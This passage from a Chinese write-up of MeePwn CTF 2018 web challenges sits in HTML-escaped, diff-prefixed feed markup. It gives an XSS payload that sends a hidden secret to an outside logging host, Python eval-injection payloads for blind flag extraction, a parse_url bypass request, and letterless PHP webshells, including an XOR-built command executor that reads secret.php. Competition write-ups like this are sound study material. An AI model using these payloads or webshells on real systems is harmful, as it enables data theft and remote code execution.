-&lt;p&gt;到这里为止，如何利用是一个很简单的事情了，我们只需要获得 &lt;code&gt;&amp;lt;input name=&#39;piece&#39; value=&#39;&amp;quot;.$secret.&amp;quot;&#39; type=&#39;hidden&#39;&amp;gt;&lt;/code&gt; 的值，然后再发到我们的服务器，即可获得 flag&lt;/p&gt;
-
-&lt;p&gt;这里需要注意的问题是，由于我们可以控制的 js 脚本是在 &lt;code&gt;&amp;lt;head&amp;gt;&amp;lt;/head&amp;gt;&lt;/code&gt; 中加载的，所以存在的问题是我们不能直接使用 &lt;code&gt;document.getElementsByName(&#39;piece&#39;)[0].value&lt;/code&gt; 尝试读取，否则会读取失败&lt;/p&gt;
-
-&lt;p&gt;此时我们能使用 &lt;code&gt;window.onload&lt;/code&gt; 函数来满足我们需求，该函数在文档内容加载完毕后才会触发，这样可以避免无法获取元素的现象&lt;/p&gt;
-
-&lt;p&gt;payload:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;http://178.128.6.184/3915ef41890b96cc883ba6ef06b944805c9650ee/index.php/*/window.onload=function()%7Bv=document.getElementsByName(%60piece%60)[0].value;(new Image()).src=`http://5ax2cw.ceye.io/`%2Bv;%7D;(function()%7B%7D)(/*/
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&#34;pycalx-pycalx2&#34;&gt;PyCalx &amp;amp; PyCalx2&lt;/h2&gt;
-
-&lt;h3 id=&#34;1&#34;&gt;1&lt;/h3&gt;
-
-&lt;p&gt;两道题核心考察的知识点都是 SQL 注入的思想，即通过构造字符串的方式使得程序泄漏出我们希望得到的信息&lt;/p&gt;
-
-&lt;p&gt;通过 &lt;a href=&#34;http://178.128.96.203/cgi-bin/server.py?source=1&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;http://178.128.96.203/cgi-bin/server.py?source=1&lt;/a&gt; 可以查看到相应的源代码&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
-import cgi
-import sys
-from html import escape
-FLAG = open(&#39;/var/www/flag&#39;,&#39;r&#39;).read()
-OK_200 = &amp;quot;&amp;quot;&amp;quot;Content-type: text/html
-&amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css&amp;quot;&amp;gt;
-&amp;lt;center&amp;gt;
-&amp;lt;title&amp;gt;PyCalx&amp;lt;/title&amp;gt;
-&amp;lt;h1&amp;gt;PyCalx&amp;lt;/h1&amp;gt;
-&amp;lt;form&amp;gt;
-&amp;lt;input class=&amp;quot;form-control col-md-4&amp;quot; type=text name=value1 placeholder=&#39;Value 1 (Example: 1  abc)&#39; autofocus/&amp;gt;
-&amp;lt;input class=&amp;quot;form-control col-md-4&amp;quot; type=text name=op placeholder=&#39;Operator (Example: + - * ** / // == != )&#39; /&amp;gt;
-&amp;lt;input class=&amp;quot;form-control col-md-4&amp;quot; type=text name=value2 placeholder=&#39;Value 2 (Example: 1  abc)&#39; /&amp;gt;
-&amp;lt;input class=&amp;quot;form-control col-md-4 btn btn-success&amp;quot; type=submit value=EVAL /&amp;gt;
-&amp;lt;/form&amp;gt;
-&amp;lt;a href=&#39;?source=1&#39;&amp;gt;Source&amp;lt;/a&amp;gt;
-&amp;lt;/center&amp;gt;
-&amp;quot;&amp;quot;&amp;quot;
-print(OK_200)
-arguments = cgi.FieldStorage()
-if &#39;source&#39; in arguments:
-    source = arguments[&#39;source&#39;].value
-else:
-    source = 0
-if source == &#39;1&#39;:
-    print(&#39;&amp;lt;pre&amp;gt;&#39;+escape(str(open(__file__,&#39;r&#39;).read()))+&#39;&amp;lt;/pre&amp;gt;&#39;)
-if &#39;value1&#39; in arguments and &#39;value2&#39; in arguments and &#39;op&#39; in arguments:
-    def get_value(val):
-        val = str(val)[:64]
-        if str(val).isdigit(): return int(val)
-        blacklist = [&#39;(&#39;,&#39;)&#39;,&#39;[&#39;,&#39;]&#39;,&#39;\&#39;&#39;,&#39;&amp;quot;&#39;] # I don&#39;t like tuple, list and dict.
-        if val == &#39;&#39; or [c for c in blacklist if c in val] != []:
-            print(&#39;&amp;lt;center&amp;gt;Invalid value&amp;lt;/center&amp;gt;&#39;)
-            sys.exit(0)
-        return val
-    def get_op(val):
-        val = str(val)[:2]
-        list_ops = [&#39;+&#39;,&#39;-&#39;,&#39;/&#39;,&#39;*&#39;,&#39;=&#39;,&#39;!&#39;]
-        if val == &#39;&#39; or val[0] not in list_ops:
-            print(&#39;&amp;lt;center&amp;gt;Invalid op&amp;lt;/center&amp;gt;&#39;)
-            sys.exit(0)
-        return val
-    op = get_op(arguments[&#39;op&#39;].value)
-    value1 = get_value(arguments[&#39;value1&#39;].value)
-    value2 = get_value(arguments[&#39;value2&#39;].value)
-    if str(value1).isdigit() ^ str(value2).isdigit():
-        print(&#39;&amp;lt;center&amp;gt;Types of the values don\&#39;t match&amp;lt;/center&amp;gt;&#39;)
-        sys.exit(0)
-    calc_eval = str(repr(value1)) + str(op) + str(repr(value2))
-    print(&#39;&amp;lt;div class=container&amp;gt;&amp;lt;div class=row&amp;gt;&amp;lt;div class=col-md-2&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;div class=&amp;quot;col-md-8&amp;quot;&amp;gt;&amp;lt;pre&amp;gt;&#39;)
-    print(&#39;&amp;gt;&amp;gt;&amp;gt;&amp;gt; print(&#39;+escape(calc_eval)+&#39;)&#39;)
-    try:
-        result = str(eval(calc_eval))
-        if result.isdigit() or result == &#39;True&#39; or result == &#39;False&#39;:
-            print(result)
-        else:
-            print(&amp;quot;Invalid&amp;quot;) # Sorry we don&#39;t support output as a string due to security issue.
-    except:
-        print(&amp;quot;Invalid&amp;quot;)
-    print(&#39;&amp;gt;&amp;gt;&amp;gt; &amp;lt;/pre&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;/div&amp;gt;&#39;)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;很明显我们要想办法获得 FLAG 的值，而这在正常情况下我们是无法读取的，所以需要考虑构造相应的字符串，使得程序会对我们的输入和 FLAG 变量进行比较&lt;/p&gt;
-
-&lt;p&gt;经过一番研究后，发现可以尝试构造如下参数：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-JSON&#34;&gt;{
-    op:&amp;quot;+&#39;&amp;quot;,
-    value1:&amp;quot;Guess&amp;quot;,
-    value2:&amp;quot;&amp;lt;=FLAG#&amp;quot;
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;此时我们构造出了表达式 &lt;code&gt;&#39;Guess&#39;+&#39;&#39;&amp;lt;=FLAG#&#39;&lt;/code&gt;，在经过 python 的 &lt;code&gt;eval&lt;/code&gt; 后对得到相应 &lt;code&gt;True&lt;/code&gt; 或 &lt;code&gt;False&lt;/code&gt; 的结果&lt;/p&gt;
-
-&lt;p&gt;然后利用 python 字符串比较的规则，可以逐字节猜测 &lt;code&gt;FLAG&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;之后会发现一个问题，即 &lt;code&gt;FLAG&lt;/code&gt; 中存在不可猜测的字符，此时我们只猜完了一半的 &lt;code&gt;FLAG&lt;/code&gt;，所以需要补充其他的变量&lt;/p&gt;
-
-&lt;p&gt;此时发现之前用于显示源代码的 &lt;code&gt;source&lt;/code&gt; 变量也同样是可以利用的，所以考虑使用 &lt;code&gt;source&lt;/code&gt; 变量&lt;/p&gt;
-
-&lt;p&gt;构造 payload 如下：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-JSON&#34;&gt;{
-    op:&amp;quot;+&#39;&amp;quot;,
-    source: &amp;quot;(&amp;quot;,
-    value1:&amp;quot;MeePwnCTF{python3.66666666666666_&amp;quot;,
-    value2:&amp;quot;+source&amp;lt;=FLAG#&amp;quot;
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;接下来的工作是使用脚本进行盲注即可&lt;/p&gt;
-
-&lt;h3 id=&#34;2&#34;&gt;2&lt;/h3&gt;
-
-&lt;p&gt;依旧可以获得源码：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
-import cgi
-import sys
-from html import escape
-FLAG = open(&#39;/var/www/flag&#39;,&#39;r&#39;).read()
-OK_200 = &amp;quot;&amp;quot;&amp;quot;Content-type: text/html
-&amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css&amp;quot;&amp;gt;
-&amp;lt;center&amp;gt;
-&amp;lt;title&amp;gt;PyCalx&amp;lt;/title&amp;gt;
-&amp;lt;h1&amp;gt;PyCalx&amp;lt;/h1&amp;gt;
-&amp;lt;form&amp;gt;
-&amp;lt;input class=&amp;quot;form-control col-md-4&amp;quot; type=text name=value1 placeholder=&#39;Value 1 (Example: 1  abc)&#39; autofocus/&amp;gt;
-&amp;lt;input class=&amp;quot;form-control col-md-4&amp;quot; type=text name=op placeholder=&#39;Operator (Example: + - * ** / // == != )&#39; /&amp;gt;
-&amp;lt;input class=&amp;quot;form-control col-md-4&amp;quot; type=text name=value2 placeholder=&#39;Value 2 (Example: 1  abc)&#39; /&amp;gt;
-&amp;lt;input class=&amp;quot;form-control col-md-4 btn btn-success&amp;quot; type=submit value=EVAL /&amp;gt;
-&amp;lt;/form&amp;gt;
-&amp;lt;a href=&#39;?source=1&#39;&amp;gt;Source&amp;lt;/a&amp;gt;
-&amp;lt;/center&amp;gt;
-&amp;quot;&amp;quot;&amp;quot;
-print(OK_200)
-arguments = cgi.FieldStorage()
-if &#39;source&#39; in arguments:
-    source = arguments[&#39;source&#39;].value
-else:
-    source = 0
-if source == &#39;1&#39;:
-    print(&#39;&amp;lt;pre&amp;gt;&#39;+escape(str(open(__file__,&#39;r&#39;).read()))+&#39;&amp;lt;/pre&amp;gt;&#39;)
-if &#39;value1&#39; in arguments and &#39;value2&#39; in arguments and &#39;op&#39; in arguments:
-    def get_value(val):
-        val = str(val)[:64]
-        if str(val).isdigit(): return int(val)
-        blacklist = [&#39;(&#39;,&#39;)&#39;,&#39;[&#39;,&#39;]&#39;,&#39;\&#39;&#39;,&#39;&amp;quot;&#39;] # I don&#39;t like tuple, list and dict.
-        if val == &#39;&#39; or [c for c in blacklist if c in val] != []:
-            print(&#39;&amp;lt;center&amp;gt;Invalid value&amp;lt;/center&amp;gt;&#39;)
-            sys.exit(0)
-        return val
-    def get_op(val):
-        val = str(val)[:2]
-        list_ops = [&#39;+&#39;,&#39;-&#39;,&#39;/&#39;,&#39;*&#39;,&#39;=&#39;,&#39;!&#39;]
-        if val == &#39;&#39; or val[0] not in list_ops:
-            print(&#39;&amp;lt;center&amp;gt;Invalid op&amp;lt;/center&amp;gt;&#39;)
-            sys.exit(0)
-        return val
-    op = get_op(get_value(arguments[&#39;op&#39;].value))
-    value1 = get_value(arguments[&#39;value1&#39;].value)
-    value2 = get_value(arguments[&#39;value2&#39;].value)
-    if str(value1).isdigit() ^ str(value2).isdigit():
-        print(&#39;&amp;lt;center&amp;gt;Types of the values don\&#39;t match&amp;lt;/center&amp;gt;&#39;)
-        sys.exit(0)
-    calc_eval = str(repr(value1)) + str(op) + str(repr(value2))
-    print(&#39;&amp;lt;div class=container&amp;gt;&amp;lt;div class=row&amp;gt;&amp;lt;div class=col-md-2&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;div class=&amp;quot;col-md-8&amp;quot;&amp;gt;&amp;lt;pre&amp;gt;&#39;)
-    print(&#39;&amp;gt;&amp;gt;&amp;gt;&amp;gt; print(&#39;+escape(calc_eval)+&#39;)&#39;)
-    try:
-        result = str(eval(calc_eval))
-        if result.isdigit() or result == &#39;True&#39; or result == &#39;False&#39;:
-            print(result)
-        else:
-            print(&amp;quot;Invalid&amp;quot;) # Sorry we don&#39;t support output as a string due to security issue.
-    except:
-        print(&amp;quot;Invalid&amp;quot;)
-    print(&#39;&amp;gt;&amp;gt;&amp;gt; &amp;lt;/pre&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;/div&amp;gt;&#39;)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;diff 之后发现对 &lt;code&gt;op&lt;/code&gt; 做了更严格的过滤，意味着我们之前的 payload 无法使用&lt;/p&gt;
-
-&lt;p&gt;可以考虑使用 python3.6 的新特性，新的格式化字符串语法：&lt;code&gt;f&#39;{}&#39;&lt;/code&gt;，具体可以参考：Python3.6新的字符串格式化语法&lt;/p&gt;
-
-&lt;p&gt;可以考虑构造这样的 payload：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-JSON&#34;&gt;{
-    op:&amp;quot;+f&amp;quot;,
-    source:&amp;quot;MeePwnCTF&amp;quot;,
-    value1:&amp;quot;True&amp;quot;,
-    value2:&amp;quot;{sys.__package__ if source &amp;lt;= FLAG else 0/0}&amp;quot;
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;此时我们构造出了类似报错注入的表达式：&lt;code&gt;&#39;True&#39;+f&#39;{sys.__package__ if source &amp;lt;= FLAG else 0/0}&#39;&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;由于 &lt;code&gt;sys.__package__&lt;/code&gt; 等于 &lt;code&gt;&#39;&#39;&lt;/code&gt;，所以如果比较的结果正确，页面将显示 &lt;code&gt;True&lt;/code&gt;，错误将显示 &lt;code&gt;Invalid&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;继续使用脚本即可爆破出 flag&lt;/p&gt;
-
-&lt;h3 id=&#34;poc&#34;&gt;poc&lt;/h3&gt;
-
-&lt;p&gt;相应脚本如下：&lt;a href=&#34;https://gist.github.com/syang2forever/b0bdd589c2c4815081f8dee788e5a832&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;solve.py&lt;/a&gt;&lt;/p&gt;
-
-&lt;h2 id=&#34;omegasector&#34;&gt;OmegaSector&lt;/h2&gt;
-
-&lt;p&gt;首先是 &lt;a href=&#34;http://138.68.228.12/?is_debug=1&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;http://138.68.228.12/?is_debug=1&lt;/a&gt; 有源码泄漏：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php 
-ob_start(); 
-session_start(); 
-?&amp;gt; 
-&amp;lt;html&amp;gt; 
-&amp;lt;style type=&amp;quot;text/css&amp;quot;&amp;gt;* {cursor: url(assets/maplcursor.cur), auto !important;}&amp;lt;/style&amp;gt; 
-&amp;lt;head&amp;gt; 
-  &amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;assets/omega_sector.css&amp;quot;&amp;gt; 
-  &amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;assets/tsu_effect.css&amp;quot;&amp;gt; 
-&amp;lt;/head&amp;gt; 
-&amp;lt;?php 
-ini_set(&amp;quot;display_errors&amp;quot;, 0); 
-include(&#39;secret.php&#39;); 
-$remote=$_SERVER[&#39;REQUEST_URI&#39;]; 
-if(strpos(urldecode($remote),&#39;..&#39;)) 
-{ 
-mapl_die(); 
-} 
-if(!parse_url($remote, PHP_URL_HOST)) 
-{ 
-    $remote=&#39;http://&#39;.$_SERVER[&#39;REMOTE_ADDR&#39;].$_SERVER[&#39;REQUEST_URI&#39;]; 
-} 
-$whoareyou=parse_url($remote, PHP_URL_HOST); 
-if($whoareyou===&amp;quot;alien.somewhere.meepwn.team&amp;quot;) 
-{ 
-    if(!isset($_GET[&#39;alien&#39;])) 
-    { 
-        $wrong = &amp;lt;&amp;lt;&amp;lt;EOF 
-&amp;lt;h2 id=&amp;quot;intro&amp;quot; class=&amp;quot;neon&amp;quot;&amp;gt;You will be driven to hidden-street place in omega sector which is only for alien! Please verify your credentials first to get into the taxi!&amp;lt;/h2&amp;gt; 
-&amp;lt;h1 id=&amp;quot;main&amp;quot; class=&amp;quot;shadow&amp;quot;&amp;gt;Are You ALIEN??&amp;lt;/h1&amp;gt; 
-&amp;lt;form id=&amp;quot;main&amp;quot;&amp;gt; 
-    &amp;lt;button type=&amp;quot;submit&amp;quot; class=&amp;quot;button-success&amp;quot; name=&amp;quot;alien&amp;quot; value=&amp;quot;Yes&amp;quot;&amp;gt;Yes&amp;lt;/button&amp;gt; 
-    &amp;lt;button type=&amp;quot;submit&amp;quot; class=&amp;quot;button-error&amp;quot; name=&amp;quot;alien&amp;quot; value=&amp;quot;No&amp;quot;&amp;gt;No&amp;lt;/button&amp;gt; 
-&amp;lt;/form&amp;gt; 
-&amp;lt;img src=&amp;quot;assets/taxi.png&amp;quot; id=&amp;quot;taxi&amp;quot; width=&amp;quot;15%&amp;quot; height=&amp;quot;20%&amp;quot; /&amp;gt; 
-EOF; 
-        echo $wrong; 
-    } 
-    if(isset($_GET[&#39;alien&#39;]) and !empty($_GET[&#39;alien&#39;])) 
-    { 
-         if($_GET[&#39;alien&#39;]===&#39;@!#$@!@@&#39;) 
-        { 
-            $_SESSION[&#39;auth&#39;]=hash(&#39;sha256&#39;, &#39;alien&#39;.$salt); 
-            exit(header( &amp;quot;Location: alien_sector.php&amp;quot; )); 
-        } 
-        else 
-        { 
-            mapl_die(); 
-        } 
-    } 
-} 
-elseif($whoareyou===&amp;quot;human.ludibrium.meepwn.team&amp;quot;) 
-{ 
-     
-    if(!isset($_GET[&#39;human&#39;])) 
-    { 
-        echo &amp;quot;&amp;quot;; 
-        $wrong = &amp;lt;&amp;lt;&amp;lt;EOF 
-&amp;lt;h2 id=&amp;quot;intro&amp;quot; class=&amp;quot;neon&amp;quot;&amp;gt;hellu human, welcome to omega sector, please verify your credentials to get into the taxi!&amp;lt;/h2&amp;gt; 
-&amp;lt;h1 id=&amp;quot;main&amp;quot; class=&amp;quot;shadow&amp;quot;&amp;gt;Are You Human?&amp;lt;/h1&amp;gt; 
-&amp;lt;form id=&amp;quot;main&amp;quot;&amp;gt; 
-    &amp;lt;button type=&amp;quot;submit&amp;quot; class=&amp;quot;button-success&amp;quot; name=&amp;quot;human&amp;quot; value=&amp;quot;Yes&amp;quot;&amp;gt;Yes&amp;lt;/button&amp;gt; 
-    &amp;lt;button type=&amp;quot;submit&amp;quot; class=&amp;quot;button-error&amp;quot; name=&amp;quot;human&amp;quot; value=&amp;quot;No&amp;quot;&amp;gt;No&amp;lt;/button&amp;gt; 
-&amp;lt;/form&amp;gt; 
-&amp;lt;img src=&amp;quot;assets/taxi.png&amp;quot; id=&amp;quot;taxi&amp;quot; width=&amp;quot;15%&amp;quot; height=&amp;quot;20%&amp;quot; /&amp;gt; 
-EOF; 
-        echo $wrong; 
-    } 
-    if(isset($_GET[&#39;human&#39;]) and !empty($_GET[&#39;human&#39;])) 
-    { 
-         if($_GET[&#39;human&#39;]===&#39;Yes&#39;) 
-        { 
-            $_SESSION[&#39;auth&#39;]=hash(&#39;sha256&#39;, &#39;human&#39;.$salt); 
-            exit(header( &amp;quot;Location: omega_sector.php&amp;quot; )); 
-        } 
-        else 
-        { 
-            mapl_die(); 
-        } 
-    } 
-} 
-else 
-{ 
-    echo &#39;&amp;lt;h2 id=&amp;quot;intro&amp;quot; class=&amp;quot;neon&amp;quot;&amp;gt;Seems like you are not belongs to this place, please comeback to ludibrium!&amp;lt;/h2&amp;gt;&#39;; 
-    echo &#39;&amp;lt;img src=&amp;quot;assets/map.jpg&amp;quot; id=&amp;quot;taxi&amp;quot; width=&amp;quot;55%&amp;quot; height=&amp;quot;55%&amp;quot; /&amp;gt;&#39;; 
-    if(isset($_GET[&#39;is_debug&#39;]) and !empty($_GET[&#39;is_debug&#39;]) and $_GET[&#39;is_debug&#39;]===&amp;quot;1&amp;quot;) 
-    { 
-        show_source(__FILE__); 
-    } 
-} 
-?&amp;gt; 
-&amp;lt;body background=&amp;quot;assets/background.jpg&amp;quot; class=&amp;quot;cenback&amp;quot;&amp;gt; 
-&amp;lt;/body&amp;gt; 
-&amp;lt;!-- is_debug=1 --&amp;gt; 
-&amp;lt;!-- All images/medias credit goes to nexon, wizet --&amp;gt; 
-&amp;lt;/html&amp;gt; 
-&amp;lt;?php ob_end_flush(); ?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;第一步需要绕过的是 &lt;code&gt;parse_url&lt;/code&gt; 的校验，使得我们能够访问 omega_sector.php 和 alien_sector.php 两个页面&lt;/p&gt;
-
-&lt;p&gt;这里存在的问题是 &lt;code&gt;$_SERVER[&#39;REQUEST_URI&#39;];&lt;/code&gt; 对应解析的是 &lt;code&gt;GET&lt;/code&gt; 后面的字符串，而这其实是我们可以控制的，所以可以通过 burp 抓包的方式进行修改&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;GET http://alien.somewhere.meepwn.team?alien=%40!%23%24%40!%40%40 HTTP/1.1
-Host: 138.68.228.12
-Cache-Control: max-age=0
-Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
-Accept-Language: zh-CN,zh;q=0.9
-Cookie: PHPSESSID=bihn4hd7oi3i59rjh7e5ejtat2
-Connection: close
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;进入这两个页面后，我们能够发现，alien_sector.php 仅限写入除数字字母外的字符，而 omega_sector.php 仅限写入数字和字母&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/MeePwn-CTF-2018-Web/alien_sector.png&#34; alt=&#34;alien_sector&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;但由于我们的提交的文件名是任意可控的，所以依旧可以尝试构造无字母的 webshell，这里是 32C3 的 idea：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?=`*`;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;这里会将 &lt;strong&gt;``&lt;/strong&gt; 内的内容当作 linux 上的命令来执行，具体可以参考：&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://wps2015.org/drops/drops/32C3%20CTF%20%E4%B8%A4%E4%B8%AAWeb%E9%A2%98%E7%9B%AE%E7%9A%84Writeup.html&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;32C3 CTF两个Web题目的Writeup&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;所以我们可以尝试构造 &lt;code&gt;/???/??? ../??????.???&lt;/code&gt; 来尝试执行 &lt;code&gt;/bin/cat ../secret.php&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;此时可以读到相应 secret.php 的源码：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-$salt=&#39;G0g0_M3s0sr4ng3rS_1337&#39;;
-$omega_sector_flag=&amp;quot;MeePwnCTF{__133-221-333-123-111___}&amp;quot;;
-//Don&#39;t attack further after captured our flag, or we will find you and we will kill you... oops, i mean ban you ^_^.
-function mapl_die(){
-    $wrong = &amp;lt;&amp;lt;&amp;lt;EOF
-&amp;lt;body background=&amp;quot;assets/wrong.jpg&amp;quot; class=&amp;quot;cenback&amp;quot;&amp;gt;&amp;lt;/body&amp;gt;
-EOF;
-    die($wrong);
-}
-?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;或者是通过字符串异或的方式拼接 webshell：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?=$_=&amp;quot;`{{{&amp;quot;^&amp;quot;?&amp;lt;&amp;gt;/&amp;quot;;${$_}[_](${$_}[__]); // &amp;lt;?php $_GET[_]($_GET[__]);
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;当然这里还可以继续 32C3 的思路，使用控制文件名的方式来构造 webshell，但更为复杂，在此掠过不表。&lt;/p&gt;
 </description>
     </item>
     
